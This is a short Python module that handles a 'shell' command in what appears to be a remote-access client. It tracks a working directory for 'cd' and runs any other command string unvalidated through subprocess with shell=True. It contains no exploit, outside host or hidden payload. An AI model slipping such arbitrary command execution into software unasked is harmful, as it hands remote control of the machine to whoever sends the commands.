import os
import subprocess

from client import client_data


def shell(args):
    """
    Execute a shell command.
    Usage: shell <command>
    """
    if len(args) < 2:
        return "Usage: shell <command>"

    command = " ".join(args[1:])

    if command.startswith("cd "):
        path = command[3:].strip()
        try:
            # Compute new directory relative to the current one
            new_dir = os.path.abspath(os.path.join(client_data.current_directory, path))
            if os.path.isdir(new_dir):
                client_data.current_directory = new_dir
                return f"Directory changed to {new_dir}"
            else:
                return f"Error: directory '{path}' does not exist."
        except Exception as e:
            return f"Error changing directory: {e}"

    result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=client_data.current_directory)

    if result.stderr:
        return f"Error: {result.stderr}"
    else:
        return result.stdout
